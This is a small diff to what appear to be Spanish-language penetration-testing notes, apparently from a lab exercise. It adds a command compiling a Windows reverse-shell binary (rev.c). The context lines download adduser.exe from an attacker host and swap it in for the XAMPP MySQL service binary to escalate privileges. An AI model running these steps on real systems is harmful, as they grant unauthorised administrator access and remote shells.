@@ -386,6 +386,15 @@ int main ()
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ``` 
 
+-----
+
+```bash
+x86_64-w64-mingw32-gcc rev.c -o rev.exe -lws2_32
+```
+
+-----
+
+
 - Movemos el binario mysql original, subimos el nuestro y cambiamos el path del servicio.
 - `iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe`: Descargamos el binario.
 - `move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`: Movemos el binario original.
